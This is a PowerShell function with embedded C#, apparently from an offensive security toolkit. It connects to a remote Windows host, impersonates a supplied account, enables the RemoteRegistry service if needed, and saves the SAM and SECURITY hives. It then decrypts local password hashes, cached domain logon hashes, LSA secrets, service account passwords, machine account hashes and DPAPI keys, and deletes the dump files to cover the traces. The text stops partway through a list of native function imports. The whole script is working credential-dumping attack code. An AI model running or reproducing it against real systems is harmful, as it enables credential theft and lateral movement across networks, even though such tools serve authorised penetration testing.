Function Get-RegistryHiveDump {
<#
.SYNOPSIS
    Get secrets from registry hives located on a remote computer.
    Privileges required: high

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-RegistryHiveDump makes a copy of the SAM and SECURITY hives on a remote computer via remote registry, then extracts secrets.
    The code is mostly stolen from SharpSecDump exploit by @G0ldenGunSec.

.PARAMETER ComputerName
    Specifies the target host.

.PARAMETER Credential
    Specifies the privileged account to use.

.EXAMPLE
    PS C:\> Get-RegistryHiveDump -ComputerName SRV.ADATUM.CORP

.EXAMPLE
    PS C:\> Get-RegistryHiveDump -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = 'localhost',

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        if ($Credential.UserName) {
            ($context, $logonToken) = Invoke-UserImpersonation -Credential $Credential
        }
    }

    Process {
        if ($result = [RemoteRegistry]::HiveDump($ComputerName)) {
            Write-Output "[$ComputerName] Successful dump`n$result"
        }
    }

    End {
        if ($context) {
            $context.Undo()
            $context.Dispose()
        }
        if ($logonToken) {
            Invoke-RevertToSelf -TokenHandle $logonToken
        }
    }
}

# Adapted from PowerView by @harmj0y and @mattifestation
Function Local:Invoke-UserImpersonation {
    [OutputType([IntPtr])]
    Param (
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Verbose "[UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        if (-not [Native]::LogonUserA($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)) {
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            throw "[UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    $identity = New-Object Security.Principal.WindowsIdentity $LogonTokenHandle
    $context = $identity.Impersonate()
    if (-not $context) {
        throw "[UserImpersonation] Impersonate() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    $context, $LogonTokenHandle
}

Function Local:Invoke-RevertToSelf {
    Param (
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Verbose "[RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        [Native]::CloseHandle($TokenHandle) | Out-Null
    }
    if (-not [Native]::RevertToSelf()) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "[RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
}

Add-Type -TypeDefinition @'
using Microsoft.Win32.SafeHandles;
using System;
using System.Runtime.InteropServices;

using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Text;
using System.Security.Cryptography;

public class Native {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupAccountName(
        string lpSystemName,
        string lpAccountName,
        [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
        ref uint cbSid,
        System.Text.StringBuilder ReferencedDomainName,
        ref uint cchReferencedDomainName,
        out SID_NAME_USE peUse
    );

    public enum SID_NAME_USE {
        SidTypeUser = 1,
        SidTypeGroup,
        SidTypeDomain,
        SidTypeAlias,
        SidTypeWellKnownGroup,
        SidTypeDeletedAccount,
        SidTypeInvalid,
        SidTypeUnknown,
        SidTypeComputer
    }

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LogonUserA(
        string lpszUserName, 
        string lpszDomain,
        string lpszPassword,
        int dwLogonType, 
        int dwLogonProvider,
        ref IntPtr  phToken
    );

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError=true)]
	public static extern bool CloseHandle(IntPtr hObject);
}

public class RemoteRegistry {

    public static string HiveDump(string singleTarget)
    {
        RemoteOps remoteConnection = new RemoteOps(singleTarget);
        //this indicates that our initial connection to the remote registry service on the remote target was unsuccessful, so no point in performing any operations
        if (remoteConnection.remoteRegHandle.Equals(IntPtr.Zero))
        {
            return null;
        }
        byte[] bootKey = GetBootKey(ref remoteConnection);
        //create names of dump files
        Random rand = new Random();
        string seedVals = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        string randStr = new string(Enumerable.Repeat(seedVals, 16).Select(s => s[rand.Next(s.Length)]).ToArray());
        string samOut = randStr.Substring(0, 8) + ".log";
        string securityOut = randStr.Substring(8, 8) + ".log";
        StringBuilder sb = new StringBuilder();

        //SAM dump stuff starts here
        string samRemoteLocation = @"\\" + singleTarget + @"\ADMIN$\" + samOut;
        if (remoteConnection.SaveRegKey("SAM", @"\Windows\" + samOut))
        {
            RegistryHive sam = remoteConnection.GetRemoteHiveDump(samRemoteLocation);
            if (sam != null)
            {
                ParseSam(bootKey, sam).ForEach(item => sb.Append(item + Environment.NewLine));
            }
            else
            {
                sb.Append("[-] Unable to access to SAM dump file");
            }
        }

        //Security dump stuff starts here
        string securityRemoteLocation = @"\\" + singleTarget + @"\ADMIN$\" + securityOut;
        if (remoteConnection.SaveRegKey("SECURITY", @"\Windows\" + securityOut))
        {
            RegistryHive security = remoteConnection.GetRemoteHiveDump(securityRemoteLocation);
            if (security != null)
            {
                ParseLsa(security, bootKey, ref remoteConnection).ForEach(item => sb.Append(item + Environment.NewLine));
            }
            else
            {
                sb.Append("[-] Unable to access to SECURITY dump file");
            }
        }
        remoteConnection.Cleanup(samRemoteLocation, securityRemoteLocation);
        return sb.ToString();
    }

    private static byte[] GetBootKey(ref RemoteOps remoteConnection)
    {
        //the bootkey is stored within the class attribute value of the 4 following keys.  This data is not accessible from regedit.exe, but can be returned from a direct query
        string[] keys = new string[4] { "JD", "Skew1", "GBG", "Data" };
        byte[] transforms = new byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };
        StringBuilder scrambledKey = new StringBuilder();

        for (int i = 0; i < 4; i++)
        {
            string keyPath = @"SYSTEM\CurrentControlSet\Control\Lsa\" + keys[i];
            IntPtr regKeyHandle = remoteConnection.OpenRegKey(keyPath);
            scrambledKey.Append(remoteConnection.GetRegKeyClassData(regKeyHandle));
            remoteConnection.CloseRegKey(regKeyHandle);
        }
        byte[] scrambled = StringToByteArray(scrambledKey.ToString());
        byte[] unscrambled = new byte[16];
        for (int i = 0; i < 16; i++)
        {
            unscrambled[i] = scrambled[transforms[i]];
        }
        return unscrambled;
    }

    private static byte[] GetHashedBootKey(byte[] bootKey, byte[] fVal)
    {
        byte[] domainData = fVal.Skip(104).ToArray();
        byte[] hashedBootKey;

        //old style hashed bootkey storage
        if (domainData[0].Equals(0x01))
        {
            byte[] f70 = fVal.Skip(112).Take(16).ToArray();
            List<byte> data = new List<byte>();
            data.AddRange(f70);
            data.AddRange(Encoding.ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"));
            data.AddRange(bootKey);
            data.AddRange(Encoding.ASCII.GetBytes("0123456789012345678901234567890123456789\0"));
            byte[] md5 = MD5.Create().ComputeHash(data.ToArray());
            byte[] f80 = fVal.Skip(128).Take(32).ToArray();
            hashedBootKey = Crypto.RC4Encrypt(md5, f80);
        }

        //new version of storage -- Win 2016 / Win 10 (potentially Win 2012) and above
        else if (domainData[0].Equals(0x02))
        {
            byte[] sk_Salt_AES = domainData.Skip(16).Take(16).ToArray();
            int sk_Data_Length = BitConverter.ToInt32(domainData, 12);
            // int offset = BitConverter.ToInt32(v,12) + 204;
            byte[] sk_Data_AES = domainData.Skip(32).Take(sk_Data_Length).ToArray();
            hashedBootKey = Crypto.DecryptAES_CBC(sk_Data_AES, bootKey, sk_Salt_AES);
        }
        else
        {
            Console.WriteLine("[-] Error parsing hashed bootkey");
            return null;
        }
        return hashedBootKey;
    }

    private static List<string> ParseSam(byte[] bootKey, RegistryHive sam)
    {
        List<string> retVal = new List<string>
        {
            "[*] SAM hashes"
        };
        try
        {
            NodeKey nk = GetNodeKey(sam, @"SAM\Domains\Account");
            byte[] fVal = nk.getChildValues("F");
            byte[] hashedBootKey = GetHashedBootKey(bootKey, fVal);
            NodeKey targetNode = nk.ChildNodes.Find(x => x.Name.Contains("Users"));
            byte[] antpassword = Encoding.ASCII.GetBytes("NTPASSWORD\0");
            byte[] almpassword = Encoding.ASCII.GetBytes("LMPASSWORD\0");
            foreach (NodeKey user in targetNode.ChildNodes.Where(x => x.Name.Contains("00000")))
            {
                byte[] rid = BitConverter.GetBytes(System.Int32.Parse(user.Name, System.Globalization.NumberStyles.HexNumber));
                byte[] v = user.getChildValues("V");
                int offset = BitConverter.ToInt32(v, 12) + 204;
                int length = BitConverter.ToInt32(v, 16);
                string username = Encoding.Unicode.GetString(v.Skip(offset).Take(length).ToArray());

                //there are 204 bytes of headers / flags prior to data in the encrypted key data structure
                int lmHashOffset = BitConverter.ToInt32(v, 156) + 204;
                int lmHashLength = BitConverter.ToInt32(v, 160);
                int ntHashOffset = BitConverter.ToInt32(v, 168) + 204;
                int ntHashLength = BitConverter.ToInt32(v, 172);
                string lmHash = "aad3b435b51404eeaad3b435b51404ee";
                string ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";

                //old style hashes
                if (v[ntHashOffset + 2].Equals(0x01))
                {
                    IEnumerable<byte> lmKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(almpassword);
                    byte[] lmHashDecryptionKey = MD5.Create().ComputeHash(lmKeyParts.ToArray());
                    IEnumerable<byte> ntKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(antpassword);
                    byte[] ntHashDecryptionKey = MD5.Create().ComputeHash(ntKeyParts.ToArray());
                    byte[] encryptedLmHash = null;
                    byte[] encryptedNtHash = null;


                    if (ntHashLength == 20)
                    {
                        encryptedNtHash = v.Skip(ntHashOffset + 4).Take(16).ToArray();
                        byte[] obfuscatedNtHashTESTING = Crypto.RC4Encrypt(ntHashDecryptionKey, encryptedNtHash);
                        ntHash = Crypto.DecryptSingleHash(obfuscatedNtHashTESTING, user.Name).Replace("-", "");
                    }
                    if (lmHashLength == 20)
                    {
                        encryptedLmHash = v.Skip(lmHashOffset + 4).Take(16).ToArray();
                        byte[] obfuscatedLmHashTESTING = Crypto.RC4Encrypt(lmHashDecryptionKey, encryptedLmHash);
                        lmHash = Crypto.DecryptSingleHash(obfuscatedLmHashTESTING, user.Name).Replace("-", "");
                    }
                }
                //new-style hashes
                else
                {
                    byte[] enc_LM_Hash = v.Skip(lmHashOffset).Take(lmHashLength).ToArray();
                    byte[] lmData = enc_LM_Hash.Skip(24).ToArray();
                    //if a hash exists, otherwise we have to return the default string val
                    if (lmData.Length > 0)
                    {
                        byte[] lmHashSalt = enc_LM_Hash.Skip(8).Take(16).ToArray();
                        byte[] desEncryptedHash = Crypto.DecryptAES_CBC(lmData, hashedBootKey.Take(16).ToArray(), lmHashSalt).Take(16).ToArray();
                        lmHash = Crypto.DecryptSingleHash(desEncryptedHash, user.Name).Replace("-", "");
                    }

                    byte[] enc_NT_Hash = v.Skip(ntHashOffset).Take(ntHashLength).ToArray();
                    byte[] ntData = enc_NT_Hash.Skip(24).ToArray();
                    //if a hash exists, otherwise we have to return the default string val
                    if (ntData.Length > 0)
                    {
                        byte[] ntHashSalt = enc_NT_Hash.Skip(8).Take(16).ToArray();
                        byte[] desEncryptedHash = Crypto.DecryptAES_CBC(ntData, hashedBootKey.Take(16).ToArray(), ntHashSalt).Take(16).ToArray();
                        ntHash = Crypto.DecryptSingleHash(desEncryptedHash, user.Name).Replace("-", "");
                    }
                }
                string ridStr = System.Int32.Parse(user.Name, System.Globalization.NumberStyles.HexNumber).ToString();
                string hashes = (lmHash + ":" + ntHash);
                retVal.Add(string.Format("{0}:{1}:{2}", username, ridStr, hashes.ToLower()));
            }
        }
        catch (Exception e)
        {
            retVal.Add("[-] Error parsing SAM dump file: " + e.ToString());
        }
        return retVal;
    }

    private static List<string> ParseLsa(RegistryHive security, byte[] bootKey, ref RemoteOps remoteConnection)
    {
        List<string> retVal = new List<string>();
        try
        {
            byte[] fVal = GetValueKey(security, @"Policy\PolEKList\Default").Data;
            LsaSecret record = new LsaSecret(fVal);
            byte[] dataVal = record.data.Take(32).ToArray();
            byte[] tempKey = Crypto.ComputeSha256(bootKey, dataVal);
            byte[] dataVal2 = record.data.Skip(32).Take(record.data.Length - 32).ToArray();
            byte[] decryptedLsaKey = Crypto.DecryptAES_ECB(dataVal2, tempKey).Skip(68).Take(32).ToArray();

            //get NLKM Secret
            byte[] nlkmKey = null;
            NodeKey nlkm = GetNodeKey(security, @"Policy\Secrets\NL$KM");
            if (nlkm != null)
            {
                retVal.Add("[*] Cached domain logon information (domain/username:hash)");
                nlkmKey = DumpSecret(nlkm, decryptedLsaKey);
                foreach (ValueKey cachedLogin in GetNodeKey(security, @"Cache").ChildValues)
                {
                    if (string.Compare(cachedLogin.Name, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0 && !IsZeroes(cachedLogin.Data.Take(16).ToArray()))
                    {
                        NL_Record cachedUser = new NL_Record(cachedLogin.Data);
                        byte[] plaintext = Crypto.DecryptAES_CBC(cachedUser.encryptedData, nlkmKey.Skip(16).Take(16).ToArray(), cachedUser.IV);
                        byte[] hashedPW = plaintext.Take(16).ToArray();
                        string username = Encoding.Unicode.GetString(plaintext.Skip(72).Take(cachedUser.userLength).ToArray());
                        string domain = Encoding.Unicode.GetString(plaintext.Skip(72 + Pad(cachedUser.userLength) + Pad(cachedUser.domainNameLength)).Take(Pad(cachedUser.dnsDomainLength)).ToArray());
                        domain = domain.Replace("\0", "");
                        retVal.Add(string.Format("{0}/{1}:$DCC2$10240#{2}#{3}", domain, username, username, BitConverter.ToString(hashedPW).Replace("-", "").ToLower()));
                    }
                }
            }

            try
            {
                retVal.Add("[*] LSA Secrets");
                foreach (NodeKey secret in GetNodeKey(security, @"Policy\Secrets").ChildNodes)
                {
                    if (string.Compare(secret.Name, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0)
                    {
                        if (string.Compare(secret.Name, "NL$KM", StringComparison.OrdinalIgnoreCase) != 0)
                        {
                            LsaSecretBlob secretBlob = new LsaSecretBlob(DumpSecret(secret, decryptedLsaKey));
                            if (secretBlob.length > 0)
                            {
                                retVal.Add(PrintSecret(secret.Name, secretBlob, ref remoteConnection));
                            }
                        }
                        else
                        {
                            LsaSecretBlob secretBlob = new LsaSecretBlob(nlkmKey);
                            if (secretBlob.length > 0)
                            {
                                retVal.Add(PrintSecret(secret.Name, secretBlob, ref remoteConnection));
                            }
                        }
                    }
                }
            }
            catch
            {
                retVal.Add("[-] No secrets to parse");
            }
        }
        catch (Exception e)
        {
            retVal.Add("[-] Error parsing SECURITY dump file: " + e.ToString());
        }
        return retVal;
    }

    private static int Pad(int data)
    {
        if ((data & 0x3) > 0)
        {
            return (data + (data & 0x3));
        }
        else
        {
            return data;
        }
    }

    private static bool IsZeroes(byte[] inputArray)
    {
        foreach (byte b in inputArray)
        {
            if (b != 0x00)
            {
                return false;
            }
        }
        return true;
    }

    private static string PrintSecret(string keyName, LsaSecretBlob secretBlob, ref RemoteOps remoteConnection)
    {
        string secretOutput = string.Format("[*] {0}\r\n", keyName);

        if (keyName.ToUpper().StartsWith("_SC_"))
        {
            string startName = remoteConnection.GetServiceStartname(keyName.Substring(4));
            string pw = Encoding.Unicode.GetString(secretBlob.secret.ToArray());
            secretOutput += string.Format("{0}:{1}", startName, pw);
        }
        else if (keyName.ToUpper().StartsWith("$MACHINE.ACC"))
        {
            string computerAcctHash = BitConverter.ToString(Crypto.Md4Hash2(secretBlob.secret)).Replace("-", "").ToLower();
            string domainName = remoteConnection.GetRegistryKeyValue(@"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", "Domain");
            string computerName = remoteConnection.GetRegistryKeyValue(@"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", "Hostname");
            secretOutput += string.Format("{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}", domainName, computerName, computerAcctHash);
        }
        else if (keyName.ToUpper().StartsWith("DPAPI"))
        {
            secretOutput += ("dpapi_machinekey:" + BitConverter.ToString(secretBlob.secret.Skip(4).Take(20).ToArray()).Replace("-", "").ToLower() + "\r\n");
            secretOutput += ("dpapi_userkey:" + BitConverter.ToString(secretBlob.secret.Skip(24).Take(20).ToArray()).Replace("-", "").ToLower());
        }
        else if (keyName.ToUpper().StartsWith("NL$KM"))
        {
            secretOutput += ("NL$KM:" + BitConverter.ToString(secretBlob.secret).Replace("-", "").ToLower());
        }
        else if (keyName.ToUpper().StartsWith("ASPNET_WP_PASSWORD"))
        {
            secretOutput += ("ASPNET:" + System.Text.Encoding.Unicode.GetString(secretBlob.secret));
        }
        else
        {
            secretOutput += ("[!] Secret type not supported yet - outputing raw secret as unicode:\r\n");
            secretOutput += (System.Text.Encoding.Unicode.GetString(secretBlob.secret));
        }
        return secretOutput;
    }

    private static byte[] DumpSecret(NodeKey secret, byte[] lsaKey)
    {
        NodeKey secretCurrVal = secret.ChildNodes.Find(x => x.Name.Contains("CurrVal"));
        byte[] value = secretCurrVal.getChildValues("Default");
        LsaSecret record = new LsaSecret(value);
        byte[] tempKey = Crypto.ComputeSha256(lsaKey, record.data.Take(32).ToArray());
        byte[] dataVal2 = record.data.Skip(32).Take(record.data.Length - 32).ToArray();
        byte[] plaintext = Crypto.DecryptAES_ECB(dataVal2, tempKey);

        return (plaintext);
    }

    private static byte[] StringToByteArray(string s)
    {
        return Enumerable.Range(0, s.Length)
            .Where(x => x % 2 == 0)
            .Select(x => Convert.ToByte(s.Substring(x, 2), 16))
            .ToArray();
    }

    static NodeKey GetNodeKey(RegistryHive hive, string path)
    {

        NodeKey node = null;
        string[] paths = path.Split('\\');

        foreach (string ch in paths)
        {
            bool found = false;
            if (node == null)
                node = hive.RootKey;

            foreach (NodeKey child in node.ChildNodes)
            {
                if (child.Name == ch)
                {
                    node = child;
                    found = true;
                    break;
                }
            }
            if (found == false)
            {
                return null;
            }
        }
        return node;
    }

    static ValueKey GetValueKey(RegistryHive hive, string path)
    {

        string keyname = path.Split('\\').Last();
        path = path.Substring(0, path.LastIndexOf('\\'));

        NodeKey node = GetNodeKey(hive, path);

        return node.ChildValues.SingleOrDefault(v => v.Name == keyname);
    }
}

class RemoteOps
{
    //global vars used throughout the lifetime of a remote connection to a single system
    public string hostname;
    IntPtr scMgr = IntPtr.Zero;
    public IntPtr remoteRegHandle = IntPtr.Zero;
    int remoteRegistryInitialStatus = 0;
    bool remoteRegistryDisabled = false;

    public RemoteOps(string remoteHostname)
    {
        hostname = remoteHostname;
        StartRemoteRegistry();
    }

    private void StartRemoteRegistry()
    {
        IntPtr scMgrHandle = GetSCManagerHandle();
        if (scMgrHandle.Equals(IntPtr.Zero))
        {
            return;
        }
        IntPtr svcHandle = OpenService(scMgrHandle, "RemoteRegistry", 0xF01FF);

        //check to see if remote registry service is currently running on the remote system
        int bytesNeeded = 0;
        QueryServiceStatusEx(svcHandle, 0, IntPtr.Zero, 0, out bytesNeeded);
        IntPtr buf = Marshal.AllocHGlobal(bytesNeeded);
        int[] serviceStatus = new int[bytesNeeded];
        QueryServiceStatusEx(svcHandle, 0, buf, bytesNeeded, out bytesNeeded);
        Marshal.Copy(buf, serviceStatus, 0, serviceStatus.Length);
        remoteRegistryInitialStatus = serviceStatus[1];

        //if remote registry is not running, lets check to see if its also disabled
        if (remoteRegistryInitialStatus != 4)
        {
            bytesNeeded = 0;
            QueryServiceConfig(svcHandle, IntPtr.Zero, 0, ref bytesNeeded);
            IntPtr qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);
            QueryServiceConfig(svcHandle, qscPtr, bytesNeeded, ref bytesNeeded);
            QueryService serviceInfo = new QueryService(qscPtr);

            //if service is disabled, enable it
            if (serviceInfo.getStartType() == 4)
            {
                uint SERVICE_NO_CHANGE = 0xFFFFFFFF;
                remoteRegistryDisabled = true;
                ChangeServiceConfig(svcHandle, SERVICE_NO_CHANGE, 0x00000003, SERVICE_NO_CHANGE, null, null, IntPtr.Zero, null, null, null, null);
            }
            if (StartService(svcHandle, 0, null) != true)
            {
                Console.WriteLine("[-] Error - RemoteRegistry service failed to start on {0}", hostname);
                CloseServiceHandle(svcHandle);
                return;
            }
            else
            {
                //Console.WriteLine("[*] RemoteRegistry service started on {0}", hostname);
            }
        }
        else
        {
            //Console.WriteLine("[*] RemoteRegistry service already started on {0}", hostname);
        }
        //done manipulating services for now, close handle + get a handle to HKLM on the remote registry we'll use for the other remote calls
        CloseServiceHandle(svcHandle);
        UIntPtr HKEY_LOCAL_MACHINE = (UIntPtr)0x80000002;
        if (RegConnectRegistry(hostname, HKEY_LOCAL_MACHINE, out remoteRegHandle) != 0)
        {
            Console.WriteLine("[-] Error connecting to the remote registry on {0}", hostname);
        }
    }

    public IntPtr OpenRegKey(string key)
    {
        int KEY_MAXIMUM_ALLOWED = 0x02000000;
        IntPtr regKeyHandle;
        if (RegOpenKeyEx(remoteRegHandle, key, 0, KEY_MAXIMUM_ALLOWED, out regKeyHandle) == 0)
        {
            return regKeyHandle;
        }
        else
        {
            Console.WriteLine("[-] Error connecting to registry key: {0}", key);
            return IntPtr.Zero;
        }
    }

    public void CloseRegKey(IntPtr regKeyHandle)
    {
        if (RegCloseKey(regKeyHandle) != 0)
        {
            Console.WriteLine("[-] Error closing registry key handle");
        }
    }

    public bool SaveRegKey(string regKeyName, string fileOutName)
    {
        IntPtr regKeyHandle = OpenRegKey(regKeyName);
        if (RegSaveKey(regKeyHandle, fileOutName, IntPtr.Zero) == 0)
        {
            RegCloseKey(regKeyHandle);
            return true;
        }
        else
        {
            try
            {
                RegCloseKey(regKeyHandle);
            }
            catch { }
            Console.WriteLine("[-] Error dumping hive to {0}", fileOutName);
            return false;
        }
    }

    public string GetRegKeyClassData(IntPtr regKeyHandle)
    {
        uint classLength = 1024;
        StringBuilder classData = new StringBuilder(1024);
        if (RegQueryInfoKey(regKeyHandle, classData, ref classLength, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero) == 0)
        {
            return classData.ToString();
        }
        else
        {
            Console.WriteLine("[-] Error getting registry key class data");
            return "";
        }
    }

    public RegistryHive GetRemoteHiveDump(string dumpfileName)
    {
        if (File.Exists(dumpfileName))
        {
            using (FileStream stream = File.OpenRead(dumpfileName))
            {
                using (BinaryReader reader = new BinaryReader(stream))
                {
                    reader.BaseStream.Position += 4132 - reader.BaseStream.Position;
                    RegistryHive hive = new RegistryHive(reader);
                    return hive;
                }
            }
        }
        else
        {
            Console.WriteLine("[-] Error unable to access hive dump file on the remote system at {0} -- manual cleanup may be needed", dumpfileName);
            return null;
        }
    }

    public string GetRegistryKeyValue(string registryKeyPath, string targetValue)
    {
        //this is used just to grab domain + computer names currently, both of which have a max length of 63
        int dataLength = 64;
        uint lpType;
        IntPtr retDataPtr = Marshal.AllocHGlobal(64);

        if (RegGetValue(remoteRegHandle, registryKeyPath, targetValue, 0x00000002, out lpType, retDataPtr, ref dataLength) == 0)
        {
            byte[] dataArr = new byte[dataLength];
            Marshal.Copy(retDataPtr, dataArr, 0, dataLength);
            string retVal = Encoding.Unicode.GetString(dataArr);
            //remove trailing null-byte from val
            retVal = retVal.Remove(retVal.Length - 1, 1);
            return retVal;
        }
        else
        {
            return "unknown";
        }
    }

    private IntPtr GetSCManagerHandle()
    {
        if (scMgr.Equals(IntPtr.Zero))
        {
            //this can time out / be slow on systems where RPC/TCP is not allowed (named pipe usage required), dont have a great workaround yet
            //https://docs.microsoft.com/en-us/windows/win32/services/services-and-rpc-tcp
            //timeout set to 24s so we can hit 21s breakpoint for RPC/TCP to fall back to RPC/NP +3s for any connection latency

            //https://stackoverflow.com/questions/13513650/how-to-set-timeout-for-a-line-of-c-sharp-code
            IAsyncResult result;
            Action action = () =>
            {
                scMgr = OpenSCManager(hostname, null, 0xF003F);
            };
            result = action.BeginInvoke(null, null);
            result.AsyncWaitHandle.WaitOne(24000);

            if (scMgr.Equals(IntPtr.Zero))
            {
                Console.WriteLine("[-] Error, unable to bind to service manager on {0}", hostname);
            }
            return scMgr;
        }
        else
        {
            return scMgr;
        }
    }

    public string GetServiceStartname(string targetService)
    {
        IntPtr scMgrHandle = GetSCManagerHandle();
        IntPtr svcHandle = OpenService(scMgrHandle, targetService, 0x00000001);
        if (!(svcHandle.Equals(IntPtr.Zero)))
        {
            int bytesNeeded = 0;
            //we're going to get a fail on this one because buffer size is 0, just need to make this call to get the out val of bytesNeeded to we can allocate the right amount of memory
            QueryServiceConfig(svcHandle, IntPtr.Zero, 0, ref bytesNeeded);
            IntPtr qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);
            if (QueryServiceConfig(svcHandle, qscPtr, bytesNeeded, ref bytesNeeded))
            {
                QueryService serviceInfo = new QueryService(qscPtr);
                string startName = serviceInfo.getStartName();
                CloseServiceHandle(svcHandle);
                return startName;
            }
            else
            {
                CloseServiceHandle(svcHandle);
            }
        }
        return "unknownUser";
    }

    //ran after all processing on a remote host is complete to restore remote registry to initial status + delete dump files
    public void Cleanup(string remoteSAM, string remoteSecurity)
    {
        RegCloseKey(remoteRegHandle);
        bool successfulCleanup = true;
        IntPtr svcHandle = OpenService(scMgr, "RemoteRegistry", 0xF01FF);
        if (remoteRegistryDisabled == true)
        {
            uint SERVICE_NO_CHANGE = 0xFFFFFFFF;
            if (ChangeServiceConfig(svcHandle, SERVICE_NO_CHANGE, 0x00000004, SERVICE_NO_CHANGE, null, null, IntPtr.Zero, null, null, null, null) != true)
            {
                Console.WriteLine("[-] Error resetting RemoteRegistry service to disabled {0}, follow-up action may be required", hostname);
                successfulCleanup = false;
            }
        }
        if (remoteRegistryInitialStatus != 4)
        {
            uint serviceStatus = 0;
            if (ControlService(svcHandle, 0x00000001, ref serviceStatus) != true)
            {
                Console.WriteLine("[-] Error stopping RemoteRegistry service on {0}, follow-up action may be required", hostname);
                successfulCleanup = false;
            }
        }
        CloseServiceHandle(svcHandle);
        CloseServiceHandle(scMgr);
        if (remoteSAM != null)
        {
            try
            {
                File.Delete(remoteSAM);
            }
            catch
            {
                Console.WriteLine("[-] Error deleting SAM dump file {0} -- manual cleanup may be needed", remoteSAM);
                successfulCleanup = false;
            }
        }
        if (remoteSecurity != null)
        {
            try
            {
                File.Delete(remoteSecurity);
            }
            catch
            {
                Console.WriteLine("[-] Error deleting SECURITY dump file {0} -- manual cleanup may be needed", remoteSecurity);
                successfulCleanup = false;
            }
        }
        if (successfulCleanup == true)
        {
            //Console.WriteLine("[*] Sucessfully cleaned up on {0}", hostname);
        }
        else
        {
            Console.WriteLine("[-] Cleanup completed with errors on {0}", hostname);
        }
    }

    //////////////registry interaction imports//////////////
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "RegOpenKeyExW", SetLastError = true)]
    public static extern int RegOpenKeyEx(IntPtr hKey, string subKey, uint options, int sam, out IntPtr phkResult);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int RegCloseKey(IntPtr hKey);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegQueryInfoKey(IntPtr hKey, [Out()] StringBuilder lpClass, ref uint lpcchClass,
        IntPtr lpReserved, IntPtr lpcSubkey, IntPtr lpcchMaxSubkeyLen,
        IntPtr lpcchMaxClassLen, IntPtr lpcValues, IntPtr lpcchMaxValueNameLen,
        IntPtr lpcbMaxValueLen, IntPtr lpSecurityDescriptor, IntPtr lpftLastWriteTime);

    [DllImport("advapi32")]
    static extern int RegSaveKey(IntPtr hKey, string fileout, IntPtr secdesc);

    [DllImport("advapi32")]
    static extern int RegConnectRegistry(string machine, UIntPtr hKey, out IntPtr pRemKey);

    [DllImport("Advapi32.dll", EntryPoint = "RegGetValueW", CharSet = CharSet.Unicode, SetLastError = true)]
    internal static extern Int32 RegGetValue(IntPtr hkey, string lpSubKey, string lpValue, uint dwFlags, out uint pdwType, IntPtr pvData, ref Int32 pcbData);


    //////////////service interaction imports//////////////
    [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr OpenService(IntPtr hSCManager, String lpServiceName, UInt32 dwDesiredAccess);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
